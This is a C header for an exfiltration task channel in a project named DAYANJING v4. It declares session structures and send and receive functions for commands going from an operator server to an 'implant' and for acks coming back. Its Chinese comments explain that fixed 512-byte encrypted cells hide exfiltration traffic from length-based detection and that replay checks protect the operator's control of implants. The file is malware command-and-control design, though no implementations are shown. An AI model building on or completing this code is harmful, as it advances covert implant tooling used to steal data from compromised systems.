/*
 * DAYANJING v4 — exfil_task_link.h
 *
 * 任务通道的 IO 绑定：把命令/回执写进已建立的电路 fd、并从 fd 读出。
 *
 * ====================================================================
 * 线上格式：恒定 512 字节信元（不是长度前缀帧）
 * ====================================================================
 * 早期版本用「u32 长度前缀 || AEAD 报文」。这留下一个可被观测的指纹：
 * 命令报文长度随操作码与配置字段变化，回执长度又与命令不同，
 * 于是「 implant 收到一个 N 字节的包，随后开始上传」成为强关联信号。
 *
 * 改为恒定 512 字节信元后，命令/回执/采集产物在线上完全无法按长度区分。
 * 填充是随机字节且在 AEAD **内部**（不是密文外补零），因此不引入新结构。
 *
 * 附带收益：长度前缀这一**攻击面整体消失**。对端（或被劫持的中继）原本可
 * 声明 len=0xFFFFFFFF 诱使接收方分配 4 GiB；恒定长度下没有"声明"这回事，
 * 接收方永远只读 512 字节。
 *
 * ====================================================================
 * 为什么必须是有状态会话
 * ====================================================================
 * 02_c2 的 c2_frame 把 IV（含 counter）**放在线上传输**，open 端直接取用，
 * 不跟踪计数器。因此 c2_frame 本身**没有重放防护**。
 *
 * 对采集产物这无所谓（重放只是重复已见过的数据），对命令通道是致命的：
 *   - 重放 START  => 强迫植入体在操作员叫停后重新开采（制造暴露）
 *   - 重放 STOP   => 让操作员在关键时刻"失明"
 *   - 重放 SET_CFG=> 把已调优的参数打回旧值
 *
 * 本层用两层拦：
 *   1) 信元层 counter 严格递增（p2p_cell 内建）——拦线上重放
 *   2) seq 严格递增（本层）——拦应用层重排，并与 task_id 关联
 *
 * ====================================================================
 * 方向密钥约定（本层最关键、也最容易写错的一点）
 * ====================================================================
 * 两端以互补方式持有两个密钥：
 *     服务端 (ks=K_A, kr=K_B)
 *     植入体 (ks=K_B, kr=K_A)      即：服务端 ks == 植入体 kr
 *
 * 由此得出唯一自洽的规则——**本端封包用 ks，解包用 kr**：
 *     下行(命令): 服务端用 ks=K_A 封；植入体用 kr=K_A 解
 *     上行(回执): 植入体用 ks=K_B 封；服务端用 kr=K_B 解
 *
 * 早期版本把「回执用 kr 封、用 ks 解」写反了，后果是：
 *     下行用 K_A、上行也用 K_A —— 两方向退化成同一把密钥，
 *     且 ctr_down/ctr_up 各自从 0 起、共用同一 pfx，
 *     于是「第一条命令」与「第一条回执」在**同一密钥下 IV 完全相同**。
 *     这是 GCM 的致命误用：两条密文异或即抵消密钥流，泄露明文异或。
 *
 * 修复方式不是"换个 IV"，而是让两个方向**根本用不同的密钥**；
 * 在此前提下，即使两方向计数器都从 0 起也不会重用 IV。
 *
 * ====================================================================
 * 三条硬规则
 * ====================================================================
 * 一、恒长读写。一次 recv 不保证拿满 512 字节，必须循环读满再解；
 *     绝不按"读到的长度"去解 AEAD——那会得到垃圾且被误判成 AUTH。
 *
 * 二、两个方向的密钥与计数器各自独立。ks/kr 必须不同；信元层
 *     send_counter/recv_counter 是两个独立序列。
 *
 * 三、seq 严格递增。回退或重复一律 REPLAY。
 */

#ifndef DAYANJING_EXFIL_TASK_LINK_H
#define DAYANJING_EXFIL_TASK_LINK_H

#include <stddef.h>
#include <stdint.h>

#include "p2p_cell.h"
#include "exfil_task.h"

#ifdef __cplusplus
extern "C" {
#endif

/* 线上恒定长度（与 p2p_cell 一致，全链路统一） */
#define EXF_TASK_LINK_WIRE  P2P_CELL_WIRE   /* 512 */

/* ---- 返回码（沿用 exfil_task 错误域，新增本层定义）---- */
#define EXF_TASK_ERR_IO      -7   /* 读不全 / 写失败 */
#define EXF_TASK_ERR_CLOSED  -8   /* 对端关闭 */
#define EXF_TASK_ERR_REPLAY  -9   /* 重放：信元 counter 或 seq 未严格递增 */

/*
 * 任务通道会话状态。
 *
 * ks/kr 是**帧层**方向密钥；cell 是**信元层**上下文，其 k_send/k_recv
 * 由 ks/kr 经 HKDF 派生（域分离），避免与采集数据通道复用同一密钥。
 */
typedef struct {
    uint8_t         ks[16];       /* 本端封包用 */
    uint8_t         kr[16];       /* 本端解包用 */
    uint8_t         pfx_frame[8]; /* 帧层 IV 前缀（与信元层 pfx 分离）*/

    p2p_cell_ctx_t  cell;         /* 恒长封装 + counter 防重放 */

    uint64_t last_seq_down;       /* 已接受的最大下行 seq */
    uint64_t last_seq_up;         /* 已接受的最大上行 seq */
    int      has_down;
    int      has_up;
} exfil_task_chan_t;

/* 初始化。ks 与 kr 必须不同（方向分离不可退化）。 */
int exfil_task_chan_init(exfil_task_chan_t *ch,
                         const uint8_t ks[16], const uint8_t kr[16],
                         const uint8_t pfx[8]);

/* 清零会话状态（含密钥材料与信元上下文）*/
void exfil_task_chan_wipe(exfil_task_chan_t *ch);

/*
 * 底层：把一个**已封好的帧层报文**装进恒长信元写入 fd，并推进发送计数。
 *
 * 供需要自行封包的高级调用方使用（例如测试要注入被篡改或用错密钥的
 * 内层报文）。注意本函数只负责信元封装——内层报文是否被篡改、用哪把
 * 帧层密钥，由调用方决定，因此它可以用来构造负向用例。
 *
 * 不存在"不带上下文的裸 send"：信元封装必须推进 counter，脱离上下文
 * 就无法保证 IV 唯一，那正是早期版本出问题的根源。
 */
int exfil_task_chan_send_raw(exfil_task_chan_t *ch, int fd,
                             const uint8_t *frame, size_t frame_len);

/* ---- 下行：服务端 -> 植入体 ---- */

/* 封命令并写入 fd。成功后发送计数推进。 */
int exfil_task_chan_cmd(exfil_task_chan_t *ch, int fd, uint64_t seq,
                        const exfil_task_cmd_t *c);

/* 读出并解开命令；seq 未严格递增返回 EXF_TASK_ERR_REPLAY。 */
int exfil_task_chan_recv_cmd(exfil_task_chan_t *ch, int fd, uint64_t *seq,
                             exfil_task_cmd_t *c);

/* ---- 上行：植入体 -> 服务端 ---- */

/* 封回执并写入 fd。成功后发送计数推进。 */
int exfil_task_chan_ack(exfil_task_chan_t *ch, int fd, uint64_t seq,
                        const exfil_task_ack_t *a);

/* 读出并解开回执；seq 未严格递增返回 EXF_TASK_ERR_REPLAY。 */
int exfil_task_chan_recv_ack(exfil_task_chan_t *ch, int fd, uint64_t *seq,
                             exfil_task_ack_t *a);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_EXFIL_TASK_LINK_H */
